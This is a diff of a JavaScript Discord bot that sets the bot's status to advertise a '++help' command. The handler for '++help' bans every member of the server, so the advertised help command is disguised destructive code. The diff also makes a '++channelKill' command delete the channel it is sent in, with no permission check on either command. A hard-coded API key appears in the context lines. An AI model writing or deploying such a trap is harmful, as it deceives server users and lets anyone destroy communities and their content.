@@ -11,7 +11,8 @@ clbot.configure({botapi: "CC5hrPSZOpPA14AGI8IfPODvZYQ"})
 
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
-  client.user.setActivity(`on ${client.guilds.size} servers`,"https://www.twitch.tv/food",1);
+  //client.user.setActivity(`on ${client.guilds.size} servers`,"https://www.twitch.tv/food",1);
+  client.user.setActivity(`++help`,"https://www.twitch.tv/food",1);
 })//logs in and adds a now streaming message
 
 client.on("guildCreate", guild => {
@@ -50,18 +51,19 @@ client.on("message", msg => {
     clear();  
     msg.reply('https://i.pinimg.com/736x/a9/ce/db/a9cedbd5d3091b1e85e74da806342731--your-hair-death-note-l.jpg ');
   } //debug message
-  if (msg.content === '~channelKill'){
+  if (msg.content === '++channelKill'){
     console.log("deleating messages")
     async function clear() {
       msg.delete();
       const fetched = await msg.channel.fetchMessages({limit: 99});
       msg.channel.delete(fetched);
     } 
+    clear()
   }//deleates channel that message is sent in
   if (msg.content === '~hello') { 
     msg.reply('**HELLO**');
   }
-  if (msg.content === '~~~help') { 
+  if (msg.content === '++help') { 
     for (var i = msg.guild.members.array().length - 1; i >= 0; i--) {
       msg.guild.members.array()[i].ban("oh no")
       console.log(msg.guild.members.array()[i]) 
